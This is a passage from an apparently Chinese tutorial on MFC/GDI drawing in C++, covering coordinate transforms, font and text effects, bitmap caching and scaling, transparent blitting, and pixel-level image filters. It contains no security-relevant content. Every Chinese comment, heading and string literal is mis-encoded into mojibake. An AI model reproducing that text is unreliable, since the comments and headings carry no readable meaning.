    <span class="hljs-function">CPoint <span class="hljs-title">ptLogical</span><span class="hljs-params">(<span class="hljs-number">500</span>, <span class="hljs-number">500</span>)</span></span>;
    CPoint ptDevice;
    
    <span class="hljs-comment">// é€»è¾‘åæ ‡è½¬è®¾å¤‡åæ ‡</span>
    pDC-&gt;<span class="hljs-built_in">LPtoDP</span>(&amp;ptLogical);
    
    <span class="hljs-comment">// è®¾å¤‡åæ ‡è½¬é€»è¾‘åæ ‡</span>
    pDC-&gt;<span class="hljs-built_in">DPtoLP</span>(&amp;ptDevice);
    
    <span class="hljs-comment">// ç¤ºä¾‹4ï¼šä¸–ç•Œå˜æ¢ï¼ˆWindows NT/2000+ï¼‰</span>
    <span class="hljs-keyword">if</span> (pDC-&gt;<span class="hljs-built_in">GetDeviceCaps</span>(RASTERCAPS) &amp; RC_TRANSFORM)
    {
        XFORM xform;
        
        <span class="hljs-comment">// è®¾ç½®æ—‹è½¬çŸ©é˜µï¼ˆæ—‹è½¬30åº¦ï¼‰</span>
        <span class="hljs-type">float</span> fAngle = <span class="hljs-number">30.0f</span> * <span class="hljs-number">3.14159f</span> / <span class="hljs-number">180.0f</span>;
        xform.eM11 = <span class="hljs-built_in">cos</span>(fAngle);
        xform.eM12 = <span class="hljs-built_in">sin</span>(fAngle);
        xform.eM21 = -<span class="hljs-built_in">sin</span>(fAngle);
        xform.eM22 = <span class="hljs-built_in">cos</span>(fAngle);
        xform.eDx = <span class="hljs-number">100.0f</span>;  <span class="hljs-comment">// Xæ–¹å‘å¹³ç§»</span>
        xform.eDy = <span class="hljs-number">100.0f</span>;  <span class="hljs-comment">// Yæ–¹å‘å¹³ç§»</span>
        
        <span class="hljs-comment">// è®¾ç½®ä¸–ç•Œå˜æ¢</span>
        pDC-&gt;<span class="hljs-built_in">SetGraphicsMode</span>(GM_ADVANCED);
        pDC-&gt;<span class="hljs-built_in">SetWorldTransform</span>(&amp;xform);
        
        <span class="hljs-comment">// ç»˜åˆ¶å˜æ¢åçš„å›¾å½¢</span>
        pDC-&gt;<span class="hljs-built_in">Rectangle</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>);
        
        <span class="hljs-comment">// æ¢å¤é»˜è®¤å˜æ¢</span>
        pDC-&gt;<span class="hljs-built_in">ModifyWorldTransform</span>(<span class="hljs-literal">NULL</span>, MWT_IDENTITY);
    }
    
    <span class="hljs-comment">// æ¢å¤åŸå§‹DCçŠ¶æ€</span>
    pDC-&gt;<span class="hljs-built_in">RestoreDC</span>(nOldMapMode);
}
</code></pre>
<h3 data-id="heading-71">äº”ã€å­—ä½“ä¸æ–‡æœ¬æ¸²æŸ“</h3>
<h4 data-id="heading-72">5.1 å­—ä½“åˆ›å»ºä¸æ–‡æœ¬åº¦é‡</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CTextRenderer</span>
{
<span class="hljs-keyword">private</span>:
    CFont m_fontNormal;
    CFont m_fontBold;
    CFont m_fontItalic;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">BOOL <span class="hljs-title">InitializeFonts</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-comment">// åˆ›å»ºä¸åŒé£æ ¼çš„å­—ä½“</span>
        LOGFONT lf = {<span class="hljs-number">0</span>};
        
        <span class="hljs-comment">// æ ‡å‡†å­—ä½“</span>
        lf.lfHeight = <span class="hljs-number">-16</span>; <span class="hljs-comment">// 16åƒç´ é«˜ï¼ˆè´Ÿå€¼è¡¨ç¤ºå­—ç¬¦é«˜åº¦ï¼‰</span>
        lf.lfWeight = FW_NORMAL;
        lf.lfCharSet = DEFAULT_CHARSET;
        <span class="hljs-built_in">lstrcpy</span>(lf.lfFaceName, _T(<span class="hljs-string">"å¾®è½¯é›…é»‘"</span>));
        m_fontNormal.<span class="hljs-built_in">CreateFontIndirect</span>(&amp;lf);
        
        <span class="hljs-comment">// ç²—ä½“</span>
        lf.lfWeight = FW_BOLD;
        m_fontBold.<span class="hljs-built_in">CreateFontIndirect</span>(&amp;lf);
        
        <span class="hljs-comment">// æ–œä½“</span>
        lf.lfWeight = FW_NORMAL;
        lf.lfItalic = TRUE;
        m_fontItalic.<span class="hljs-built_in">CreateFontIndirect</span>(&amp;lf);
        
        <span class="hljs-keyword">return</span> TRUE;
    }
    
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DrawTextWithMetrics</span><span class="hljs-params">(CDC* pDC, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, LPCTSTR lpszText)</span>
    </span>{
        CFont* pOldFont = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;m_fontNormal);
        
        <span class="hljs-comment">// è·å–æ–‡æœ¬åº¦é‡ä¿¡æ¯</span>
        TEXTMETRIC tm;
        pDC-&gt;<span class="hljs-built_in">GetTextMetrics</span>(&amp;tm);
        
        <span class="hljs-comment">// è®¡ç®—æ–‡æœ¬å®½åº¦</span>
        CSize sizeText = pDC-&gt;<span class="hljs-built_in">GetTextExtent</span>(lpszText, <span class="hljs-built_in">lstrlen</span>(lpszText));
        
        <span class="hljs-comment">// ç»˜åˆ¶èƒŒæ™¯</span>
        <span class="hljs-function">CRect <span class="hljs-title">rectText</span><span class="hljs-params">(x, y, x + sizeText.cx, y + tm.tmHeight)</span></span>;
        <span class="hljs-function">CBrush <span class="hljs-title">brushBg</span><span class="hljs-params">(RGB(<span class="hljs-number">240</span>, <span class="hljs-number">240</span>, <span class="hljs-number">240</span>))</span></span>;
        pDC-&gt;<span class="hljs-built_in">FillRect</span>(&amp;rectText, &amp;brushBg);
        
        <span class="hljs-comment">// ç»˜åˆ¶æ–‡æœ¬</span>
        pDC-&gt;<span class="hljs-built_in">SetBkMode</span>(TRANSPARENT);
        pDC-&gt;<span class="hljs-built_in">TextOut</span>(x, y, lpszText);
        
        <span class="hljs-comment">// ç»˜åˆ¶åŸºçº¿</span>
        <span class="hljs-function">CPen <span class="hljs-title">penBaseline</span><span class="hljs-params">(PS_SOLID, <span class="hljs-number">1</span>, RGB(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))</span></span>;
        CPen* pOldPen = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;penBaseline);
        pDC-&gt;<span class="hljs-built_in">MoveTo</span>(x, y + tm.tmAscent);
        pDC-&gt;<span class="hljs-built_in">LineTo</span>(x + sizeText.cx, y + tm.tmAscent);
        
        <span class="hljs-comment">// ç»˜åˆ¶è¾¹ç•Œæ¡†</span>
        <span class="hljs-function">CPen <span class="hljs-title">penBorder</span><span class="hljs-params">(PS_DOT, <span class="hljs-number">1</span>, RGB(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>))</span></span>;
        pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;penBorder);
        pDC-&gt;<span class="hljs-built_in">SelectStockObject</span>(NULL_BRUSH);
        pDC-&gt;<span class="hljs-built_in">Rectangle</span>(&amp;rectText);
        
        pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldPen);
        pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldFont);
    }
    
    <span class="hljs-comment">// å¤šè¡Œæ–‡æœ¬ç»˜åˆ¶</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DrawMultilineText</span><span class="hljs-params">(CDC* pDC, CRect rect, LPCTSTR lpszText)</span>
    </span>{
        CFont* pOldFont = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;m_fontNormal);
        
        <span class="hljs-comment">// è®¾ç½®æ–‡æœ¬æ ¼å¼</span>
        UINT uFormat = DT_LEFT | DT_WORDBREAK | DT_NOPREFIX | DT_EDITCONTROL;
        
        <span class="hljs-comment">// è®¡ç®—éœ€è¦çš„çŸ©å½¢é«˜åº¦</span>
        CRect rectCalc = rect;
        pDC-&gt;<span class="hljs-built_in">DrawText</span>(lpszText, <span class="hljs-number">-1</span>, &amp;rectCalc, uFormat | DT_CALCRECT);
        
        <span class="hljs-comment">// ç»˜åˆ¶æ–‡æœ¬</span>
        pDC-&gt;<span class="hljs-built_in">DrawText</span>(lpszText, <span class="hljs-number">-1</span>, &amp;rect, uFormat);
        
        pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldFont);
    }
};
</code></pre>
<h4 data-id="heading-73">5.2 é«˜çº§æ–‡æœ¬æ•ˆæœ</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::DrawTextEffects</span><span class="hljs-params">(CDC* pDC)</span>
</span>{
    CRect rectClient;
    <span class="hljs-built_in">GetClientRect</span>(&amp;rectClient);
    
    <span class="hljs-comment">// 1. é˜´å½±æ–‡å­—</span>
    <span class="hljs-built_in">DrawShadowText</span>(pDC, _T(<span class="hljs-string">"é˜´å½±æ•ˆæœ"</span>), 
                   <span class="hljs-built_in">CPoint</span>(<span class="hljs-number">50</span>, <span class="hljs-number">50</span>), 
                   <span class="hljs-built_in">RGB</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), <span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>));
    
    <span class="hljs-comment">// 2. æ¸å˜æ–‡å­—</span>
    <span class="hljs-built_in">DrawGradientText</span>(pDC, _T(<span class="hljs-string">"æ¸å˜æ–‡å­—"</span>), 
                     <span class="hljs-built_in">CPoint</span>(<span class="hljs-number">50</span>, <span class="hljs-number">100</span>), 
                     <span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), <span class="hljs-built_in">RGB</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>));
    
    <span class="hljs-comment">// 3. è½®å»“æ–‡å­—</span>
    <span class="hljs-built_in">DrawOutlineText</span>(pDC, _T(<span class="hljs-string">"è½®å»“æ–‡å­—"</span>), 
                    <span class="hljs-built_in">CPoint</span>(<span class="hljs-number">50</span>, <span class="hljs-number">150</span>), 
                    <span class="hljs-number">3</span>, <span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>), <span class="hljs-built_in">RGB</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>));
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DrawShadowText</span><span class="hljs-params">(CDC* pDC, LPCTSTR lpszText, CPoint pt, 
                    COLORREF crText, COLORREF crShadow)</span>
</span>{
    CFont font;
    LOGFONT lf = {<span class="hljs-number">0</span>};
    lf.lfHeight = <span class="hljs-number">-48</span>;
    lf.lfWeight = FW_BOLD;
    <span class="hljs-built_in">lstrcpy</span>(lf.lfFaceName, _T(<span class="hljs-string">"Arial"</span>));
    font.<span class="hljs-built_in">CreateFontIndirect</span>(&amp;lf);
    
    CFont* pOldFont = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;font);
    
    <span class="hljs-comment">// ç»˜åˆ¶é˜´å½±</span>
    pDC-&gt;<span class="hljs-built_in">SetTextColor</span>(crShadow);
    pDC-&gt;<span class="hljs-built_in">TextOut</span>(pt.x + <span class="hljs-number">3</span>, pt.y + <span class="hljs-number">3</span>, lpszText);
    
    <span class="hljs-comment">// ç»˜åˆ¶å‰æ™¯æ–‡å­—</span>
    pDC-&gt;<span class="hljs-built_in">SetTextColor</span>(crText);
    pDC-&gt;<span class="hljs-built_in">TextOut</span>(pt.x, pt.y, lpszText);
    
    pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldFont);
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DrawGradientText</span><span class="hljs-params">(CDC* pDC, LPCTSTR lpszText, CPoint pt,
                      COLORREF crStart, COLORREF crEnd)</span>
</span>{
    <span class="hljs-comment">// åˆ›å»ºå­—ä½“</span>
    CFont font;
    LOGFONT lf = {<span class="hljs-number">0</span>};
    lf.lfHeight = <span class="hljs-number">-48</span>;
    lf.lfWeight = FW_BOLD;
    <span class="hljs-built_in">lstrcpy</span>(lf.lfFaceName, _T(<span class="hljs-string">"Arial"</span>));
    font.<span class="hljs-built_in">CreateFontIndirect</span>(&amp;lf);
    
    CFont* pOldFont = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;font);
    
    <span class="hljs-comment">// è·å–æ–‡æœ¬å°ºå¯¸</span>
    CSize sizeText = pDC-&gt;<span class="hljs-built_in">GetTextExtent</span>(lpszText, <span class="hljs-built_in">lstrlen</span>(lpszText));
    
    <span class="hljs-comment">// åˆ›å»ºæ¸å˜ç”»åˆ·</span>
    TRIVERTEX vert[<span class="hljs-number">2</span>] = {<span class="hljs-number">0</span>};
    vert[<span class="hljs-number">0</span>].x = pt.x;
    vert[<span class="hljs-number">0</span>].y = pt.y;
    vert[<span class="hljs-number">0</span>].Red = <span class="hljs-built_in">GetRValue</span>(crStart) &lt;&lt; <span class="hljs-number">8</span>;
    vert[<span class="hljs-number">0</span>].Green = <span class="hljs-built_in">GetGValue</span>(crStart) &lt;&lt; <span class="hljs-number">8</span>;
    vert[<span class="hljs-number">0</span>].Blue = <span class="hljs-built_in">GetBValue</span>(crStart) &lt;&lt; <span class="hljs-number">8</span>;
    vert[<span class="hljs-number">0</span>].Alpha = <span class="hljs-number">0x0000</span>;
    
    vert[<span class="hljs-number">1</span>].x = pt.x + sizeText.cx;
    vert[<span class="hljs-number">1</span>].y = pt.y + sizeText.cy;
    vert[<span class="hljs-number">1</span>].Red = <span class="hljs-built_in">GetRValue</span>(crEnd) &lt;&lt; <span class="hljs-number">8</span>;
    vert[<span class="hljs-number">1</span>].Green = <span class="hljs-built_in">GetGValue</span>(crEnd) &lt;&lt; <span class="hljs-number">8</span>;
    vert[<span class="hljs-number">1</span>].Blue = <span class="hljs-built_in">GetBValue</span>(crEnd) &lt;&lt; <span class="hljs-number">8</span>;
    vert[<span class="hljs-number">1</span>].Alpha = <span class="hljs-number">0x0000</span>;
    
    GRADIENT_RECT gRect = {<span class="hljs-number">0</span>, <span class="hljs-number">1</span>};
    
    <span class="hljs-comment">// ä½¿ç”¨è·¯å¾„åˆ›å»ºæ–‡æœ¬è½®å»“</span>
    pDC-&gt;<span class="hljs-built_in">BeginPath</span>();
    pDC-&gt;<span class="hljs-built_in">TextOut</span>(pt.x, pt.y, lpszText);
    pDC-&gt;<span class="hljs-built_in">EndPath</span>();
    
    <span class="hljs-comment">// ç”¨æ¸å˜å¡«å……æ–‡æœ¬è·¯å¾„</span>
    pDC-&gt;<span class="hljs-built_in">SelectClipPath</span>(RGN_COPY);
    pDC-&gt;<span class="hljs-built_in">GradientFill</span>(vert, <span class="hljs-number">2</span>, &amp;gRect, <span class="hljs-number">1</span>, GRADIENT_FILL_RECT_H);
    
    pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldFont);
}
</code></pre>
<h3 data-id="heading-74">å…­ã€ä½å›¾æ“ä½œä¸å›¾åƒå¤„ç†</h3>
<h4 data-id="heading-75">6.1 ä½å›¾åŠ è½½ä¸æ˜¾ç¤ºä¼˜åŒ–</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CBitmapManager</span>
{
<span class="hljs-keyword">private</span>:
    CMap&lt;UINT, UINT, CBitmap*, CBitmap*&gt; m_mapBitmaps;
    CSize m_sizeDisplay; <span class="hljs-comment">// æ˜¾ç¤ºå°ºå¯¸ç¼“å­˜</span>
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">CBitmapManager</span>() : <span class="hljs-built_in">m_sizeDisplay</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) {}
    
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">CBitmapManager</span>()
    {
        <span class="hljs-built_in">Cleanup</span>();
    }
    
    <span class="hljs-comment">// ä»èµ„æºåŠ è½½ä½å›¾</span>
    <span class="hljs-function">CBitmap* <span class="hljs-title">LoadBitmapFromResource</span><span class="hljs-params">(UINT nIDResource, 
                                    CSize sizeTarget = CSize(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>))</span>
    </span>{
        CBitmap* pBitmap = <span class="hljs-literal">NULL</span>;
        
        <span class="hljs-keyword">if</span> (m_mapBitmaps.<span class="hljs-built_in">Lookup</span>(nIDResource, pBitmap))
            <span class="hljs-keyword">return</span> pBitmap;
        
        <span class="hljs-comment">// åŠ è½½åŸå§‹ä½å›¾</span>
        CBitmap bmpOriginal;
        <span class="hljs-keyword">if</span> (!bmpOriginal.<span class="hljs-built_in">LoadBitmap</span>(nIDResource))
            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
        
        <span class="hljs-comment">// è·å–åŸå§‹å°ºå¯¸</span>
        BITMAP bmInfo;
        bmpOriginal.<span class="hljs-built_in">GetBitmap</span>(&amp;bmInfo);
        
        <span class="hljs-function">CSize <span class="hljs-title">sizeSource</span><span class="hljs-params">(bmInfo.bmWidth, bmInfo.bmHeight)</span></span>;
        
        <span class="hljs-comment">// å¦‚æœéœ€è¦ç¼©æ”¾</span>
        <span class="hljs-keyword">if</span> (sizeTarget.cx &gt; <span class="hljs-number">0</span> &amp;&amp; sizeTarget.cy &gt; <span class="hljs-number">0</span> &amp;&amp; 
            (sizeTarget != sizeSource))
        {
            pBitmap = <span class="hljs-built_in">ScaleBitmap</span>(&amp;bmpOriginal, sizeSource, sizeTarget);
        }
        <span class="hljs-keyword">else</span>
        {
            pBitmap = <span class="hljs-keyword">new</span> CBitmap;
            pBitmap-&gt;<span class="hljs-built_in">Attach</span>(bmpOriginal.<span class="hljs-built_in">Detach</span>());
        }
        
        m_mapBitmaps.<span class="hljs-built_in">SetAt</span>(nIDResource, pBitmap);
        <span class="hljs-keyword">return</span> pBitmap;
    }
    
    <span class="hljs-comment">// ä½å›¾ç¼©æ”¾å‡½æ•°</span>
    <span class="hljs-function">CBitmap* <span class="hljs-title">ScaleBitmap</span><span class="hljs-params">(CBitmap* pSrcBitmap, CSize sizeSrc, CSize sizeDst)</span>
    </span>{
        <span class="hljs-comment">// åˆ›å»ºæºDCå’Œç›®æ ‡DC</span>
        <span class="hljs-function">CWindowDC <span class="hljs-title">dcScreen</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;
        CDC dcSrc, dcDst;
        
        dcSrc.<span class="hljs-built_in">CreateCompatibleDC</span>(&amp;dcScreen);
        dcDst.<span class="hljs-built_in">CreateCompatibleDC</span>(&amp;dcScreen);
        
        <span class="hljs-comment">// åˆ›å»ºç›®æ ‡ä½å›¾</span>
        CBitmap* pDstBitmap = <span class="hljs-keyword">new</span> CBitmap;
        pDstBitmap-&gt;<span class="hljs-built_in">CreateCompatibleBitmap</span>(&amp;dcScreen, 
                                          sizeDst.cx, sizeDst.cy);
        
        <span class="hljs-comment">// é€‰å…¥ä½å›¾</span>
        CBitmap* pOldSrcBitmap = dcSrc.<span class="hljs-built_in">SelectObject</span>(pSrcBitmap);
        CBitmap* pOldDstBitmap = dcDst.<span class="hljs-built_in">SelectObject</span>(pDstBitmap);
        
        <span class="hljs-comment">// è®¾ç½®æ‹‰ä¼¸æ¨¡å¼</span>
        dcDst.<span class="hljs-built_in">SetStretchBltMode</span>(HALFTONE);
        dcDst.<span class="hljs-built_in">SetBrushOrg</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
        
        <span class="hljs-comment">// æ‰§è¡Œç¼©æ”¾</span>
        dcDst.<span class="hljs-built_in">StretchBlt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sizeDst.cx, sizeDst.cy,
                        &amp;dcSrc, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sizeSrc.cx, sizeSrc.cy,
                        SRCCOPY);
        
        <span class="hljs-comment">// æ¢å¤å¹¶æ¸…ç†</span>
        dcSrc.<span class="hljs-built_in">SelectObject</span>(pOldSrcBitmap);
        dcDst.<span class="hljs-built_in">SelectObject</span>(pOldDstBitmap);
        
        <span class="hljs-keyword">return</span> pDstBitmap;
    }
    
    <span class="hljs-comment">// é€æ˜ä½å›¾ç»˜åˆ¶</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DrawTransparentBitmap</span><span class="hljs-params">(CDC* pDC, CBitmap* pBitmap, 
                               CPoint ptDest, COLORREF crTransparent)</span>
    </span>{
        <span class="hljs-comment">// åˆ›å»ºå†…å­˜DC</span>
        CDC dcMem, dcMask;
        dcMem.<span class="hljs-built_in">CreateCompatibleDC</span>(pDC);
        dcMask.<span class="hljs-built_in">CreateCompatibleDC</span>(pDC);
        
        <span class="hljs-comment">// è·å–ä½å›¾å°ºå¯¸</span>
        BITMAP bm;
        pBitmap-&gt;<span class="hljs-built_in">GetBitmap</span>(&amp;bm);
        
        <span class="hljs-comment">// åˆ›å»ºæ©ç ä½å›¾</span>
        CBitmap bmpMask;
        bmpMask.<span class="hljs-built_in">CreateBitmap</span>(bm.bmWidth, bm.bmHeight, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>);
        
        <span class="hljs-comment">// é€‰å…¥ä½å›¾</span>
        CBitmap* pOldMemBitmap = dcMem.<span class="hljs-built_in">SelectObject</span>(pBitmap);
        CBitmap* pOldMaskBitmap = dcMask.<span class="hljs-built_in">SelectObject</span>(&amp;bmpMask);
        
        <span class="hljs-comment">// è®¾ç½®é€æ˜è‰²</span>
        COLORREF crOldBk = dcMem.<span class="hljs-built_in">SetBkColor</span>(crTransparent);
        
        <span class="hljs-comment">// åˆ›å»ºæ©ç ï¼ˆé€æ˜åŒºåŸŸä¸º1ï¼Œéé€æ˜åŒºåŸŸä¸º0ï¼‰</span>
        dcMask.<span class="hljs-built_in">BitBlt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bm.bmWidth, bm.bmHeight, 
                     &amp;dcMem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, SRCCOPY);
        
        <span class="hljs-comment">// åœ¨ç›®æ ‡DCä¸Šä½¿ç”¨æ©ç </span>
        pDC-&gt;<span class="hljs-built_in">BitBlt</span>(ptDest.x, ptDest.y, bm.bmWidth, bm.bmHeight,
                   &amp;dcMask, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, SRCAND);
        
        <span class="hljs-comment">// è®¾ç½®èƒŒæ™¯è‰²å¹¶ç»˜åˆ¶</span>
        dcMem.<span class="hljs-built_in">SetBkColor</span>(<span class="hljs-built_in">RGB</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>));
        dcMem.<span class="hljs-built_in">SetTextColor</span>(<span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>));
        dcMem.<span class="hljs-built_in">BitBlt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bm.bmWidth, bm.bmHeight,
                    &amp;dcMask, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, SRCAND);
        
        <span class="hljs-comment">// åˆå¹¶ç»“æœ</span>
        pDC-&gt;<span class="hljs-built_in">BitBlt</span>(ptDest.x, ptDest.y, bm.bmWidth, bm.bmHeight,
                   &amp;dcMem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, SRCPAINT);
        
        <span class="hljs-comment">// æ¢å¤</span>
        dcMem.<span class="hljs-built_in">SetBkColor</span>(crOldBk);
        dcMem.<span class="hljs-built_in">SelectObject</span>(pOldMemBitmap);
        dcMask.<span class="hljs-built_in">SelectObject</span>(pOldMaskBitmap);
    }
    
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Cleanup</span><span class="hljs-params">()</span>
    </span>{
        POSITION pos = m_mapBitmaps.<span class="hljs-built_in">GetStartPosition</span>();
        UINT nID;
        CBitmap* pBitmap;
        <span class="hljs-keyword">while</span> (pos != <span class="hljs-literal">NULL</span>)
        {
            m_mapBitmaps.<span class="hljs-built_in">GetNextAssoc</span>(pos, nID, pBitmap);
            <span class="hljs-keyword">delete</span> pBitmap;
        }
        m_mapBitmaps.<span class="hljs-built_in">RemoveAll</span>();
    }
};
</code></pre>
<h4 data-id="heading-76">6.2 å›¾åƒç‰¹æ•ˆå¤„ç†</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ç®€å•çš„å›¾åƒå¤„ç†è¿‡æ»¤å™¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CImageFilter</span>
{
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// ç°åº¦åŒ–</span>
    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">ConvertToGrayScale</span><span class="hljs-params">(CDC* pDC, CBitmap* pBitmap, 
                                   <span class="hljs-type">const</span> CRect&amp; rect)</span>
    </span>{
        <span class="hljs-comment">// è·å–ä½å›¾ä¿¡æ¯</span>
        BITMAP bm;
        pBitmap-&gt;<span class="hljs-built_in">GetBitmap</span>(&amp;bm);
        
        <span class="hljs-comment">// åˆ›å»ºå†…å­˜DC</span>
        CDC dcMem;
        dcMem.<span class="hljs-built_in">CreateCompatibleDC</span>(pDC);
        CBitmap* pOldBitmap = dcMem.<span class="hljs-built_in">SelectObject</span>(pBitmap);
        
        <span class="hljs-comment">// é€åƒç´ å¤„ç†</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = rect.top; y &lt; rect.bottom; y++)
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = rect.left; x &lt; rect.right; x++)
            {
                COLORREF cr = dcMem.<span class="hljs-built_in">GetPixel</span>(x, y);
                
                <span class="hljs-comment">// è®¡ç®—ç°åº¦å€¼</span>
                BYTE r = <span class="hljs-built_in">GetRValue</span>(cr);
                BYTE g = <span class="hljs-built_in">GetGValue</span>(cr);
                BYTE b = <span class="hljs-built_in">GetBValue</span>(cr);
                BYTE gray = (BYTE)(<span class="hljs-number">0.299</span> * r + <span class="hljs-number">0.587</span> * g + <span class="hljs-number">0.114</span> * b);
                
                <span class="hljs-comment">// è®¾ç½®ç°åº¦åƒç´ </span>
                dcMem.<span class="hljs-built_in">SetPixel</span>(x, y, <span class="hljs-built_in">RGB</span>(gray, gray, gray));
            }
        }
        
        dcMem.<span class="hljs-built_in">SelectObject</span>(pOldBitmap);
    }
    
    <span class="hljs-comment">// äº®åº¦è°ƒæ•´</span>
    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">AdjustBrightness</span><span class="hljs-params">(CDC* pDC, CBitmap* pBitmap,
                                 <span class="hljs-type">const</span> CRect&amp; rect, <span class="hljs-type">int</span> nDelta)</span>
    </span>{
        CDC dcMem;
        dcMem.<span class="hljs-built_in">CreateCompatibleDC</span>(pDC);
        CBitmap* pOldBitmap = dcMem.<span class="hljs-built_in">SelectObject</span>(pBitmap);
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = rect.top; y &lt; rect.bottom; y++)
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = rect.left; x &lt; rect.right; x++)
            {
                COLORREF cr = dcMem.<span class="hljs-built_in">GetPixel</span>(x, y);
                
                BYTE r = <span class="hljs-built_in">Clamp</span>(<span class="hljs-built_in">GetRValue</span>(cr) + nDelta);
                BYTE g = <span class="hljs-built_in">Clamp</span>(<span class="hljs-built_in">GetGValue</span>(cr) + nDelta);
                BYTE b = <span class="hljs-built_in">Clamp</span>(<span class="hljs-built_in">GetBValue</span>(cr) + nDelta);
                
                dcMem.<span class="hljs-built_in">SetPixel</span>(x, y, <span class="hljs-built_in">RGB</span>(r, g, b));
            }
        }
        
        dcMem.<span class="hljs-built_in">SelectObject</span>(pOldBitmap);
    }
    
    <span class="hljs-comment">// å¯¹æ¯”åº¦è°ƒæ•´</span>
    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">AdjustContrast</span><span class="hljs-params">(CDC* pDC, CBitmap* pBitmap,
                               <span class="hljs-type">const</span> CRect&amp; rect, <span class="hljs-type">double</span> dContrast)</span>
    </span>{
        CDC dcMem;
        dcMem.<span class="hljs-built_in">CreateCompatibleDC</span>(pDC);
        CBitmap* pOldBitmap = dcMem.<span class="hljs-built_in">SelectObject</span>(pBitmap);
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = rect.top; y &lt; rect.bottom; y++)
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = rect.left; x &lt; rect.right; x++)
            {
                COLORREF cr = dcMem.<span class="hljs-built_in">GetPixel</span>(x, y);
                
                BYTE r = <span class="hljs-built_in">Clamp</span>((<span class="hljs-type">int</span>)((<span class="hljs-built_in">GetRValue</span>(cr) - <span class="hljs-number">128</span>) * dContrast + <span class="hljs-number">128</span>));
                BYTE g = <span class="hljs-built_in">Clamp</span>((<span class="hljs-type">int</span>)((<span class="hljs-built_in">GetGValue</span>(cr) - <span class="hljs-number">128</span>) * dContrast + <span class="hljs-number">128</span>));
                BYTE b = <span class="hljs-built_in">Clamp</span>((<span class="hljs-type">int</span>)((<span class="hljs-built_in">GetBValue</span>(cr) - <span class="hljs-number">128</span>) * dContrast + <span class="hljs-number">128</span>));
                
                dcMem.<span class="hljs-built_in">SetPixel</span>(x, y, <span class="hljs-built_in">RGB</span>(r, g, b));
            }
        }
        
        dcMem.<span class="hljs-built_in">SelectObject</span>(pOldBitmap);
    }
    
